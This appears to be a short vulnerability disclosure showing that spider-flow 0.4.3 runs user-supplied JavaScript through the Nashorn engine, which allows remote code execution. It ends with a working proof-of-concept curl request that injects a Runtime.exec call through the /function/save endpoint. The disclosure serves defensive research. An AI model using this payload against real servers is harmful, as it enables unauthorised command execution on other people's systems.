### spider-flow code injection causes rce

spider-flow code injection causes command execution project introduction spider-flow is a crawler platform that graphically defines the crawler process and implements a crawler without code project address https://github.com/ssssssss-team/spider-flow project versions 0.4.3 vulnerability analysis Found spider-flow-web using script engine Nashorn can parse javascript code and run it. Java objects can be invoked through js code. FunctionService.saveFunction() is executed at line 33 of src/main/java/org/spiderflow/controller/FunctionController.java

Author: Puppy

![img](https://cdn-images-1.medium.com/max/750/1*-dTOdO2a6JyZH7CbxvuUyA.png)

The parameters passed are



![img](https://cdn-images-1.medium.com/max/750/1*_ZENiMegFA8QFPrcRFu62w.png)

ScriptManager.validScript() is called in line 11 of src/main/java/org/spiderflow/core/service/FunctionService.java



![img](https://cdn-images-1.medium.com/max/750/1*QaF11hqV9EJupRuiwe6yDQ.png)

Before that, there was initialization. [@PostConstruct](http://twitter.com/PostConstruct) annotation initializes init(). Call ScriptManager.createEngine () to complete initialization of the function.



![img](https://cdn-images-1.medium.com/max/750/1*fOVxYGs1yK6ArxoSIsgp0A.png)

The initialization process creates the Nashorn engine



![img](https://cdn-images-1.medium.com/max/750/1*Ybs-WmLVZByttQYCjSxRBg.png)

Then concatenate the previous function name scripts. This can be considered empty.

![img](https://cdn-images-1.medium.com/max/750/1*9T74aMq50S5MRPVCIH-keA.png)

Here we think of the first existence 
 The custom validScript function executed later here uses the Nashorn engine to execute the js code.

![img](https://cdn-images-1.medium.com/max/750/1*MJSwjq_jSIg9ZM1t1k6vdQ.png)

Notice here that the code is encapsulated in a function. If successful, encapsulation requires a function call to invoke. You can escape directly from here.



### poc



```
curl http://127.0.0.1:8088/function/save -X POST -d "id=&name=a&parameter=&script=}Java.type(\"java.lang.Runtime\").getRuntime().exec(\"calc\");{"
```

![img](https://cdn-images-1.medium.com/max/750/1*NDwh_b5VZTtzBh8Fzu5btA.png)